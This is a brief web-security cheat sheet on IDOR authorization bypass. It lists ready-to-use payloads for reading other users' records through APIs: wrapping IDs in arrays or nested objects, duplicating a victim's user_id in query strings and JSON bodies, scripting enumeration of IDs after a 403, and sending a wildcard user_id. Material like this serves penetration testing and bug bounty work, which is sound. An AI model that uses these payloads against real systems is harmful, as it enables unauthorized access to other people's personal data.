# Web - IDOR

## Object Level Auth Bypass

```
Instead of {“id”:111} send {“id”:[111]}
Instead of {“id”:111} send {“id”:{“id”:111}}
/api/get_profile?user_id=<legit_id>&user_id=<victim’s_id>
/api/get_profile?user_id=<victim’s_id>&user_id=<user_id>

POST api/get_profile
{“user_id”:<legit_id>,”user_id”:<victim’s_id>}

POST api/get_profile
{“user_id”:<victim’s_id>,”user_id”:<legit_id>}

if the endpoint “api/v1/trips/666” returned 403, run a script to enumerate 50 random IDs from 0001 to 9999

Always try to replace values with numeric IDs

Send wildcard {"user_id":"*"}
```
